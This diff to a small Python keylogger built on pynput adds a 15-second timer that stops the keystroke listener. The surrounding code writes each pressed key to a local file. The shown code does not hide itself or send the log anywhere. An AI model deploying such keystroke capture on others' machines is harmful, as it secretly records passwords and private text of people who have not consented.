@@ -1,3 +1,5 @@
+import time
+import threading
 from pynput.keyboard import Listener
 
 def writetofile(key):
@@ -22,6 +24,11 @@ def writetofile(key):
         f.write( keydata)
 
 
+def stop():
+    print("Stopping keylogger...")
+    l.stop()
+
 with Listener(on_press=writetofile) as l:
+    threading.Timer(15, stop).start()
     l.join()
 
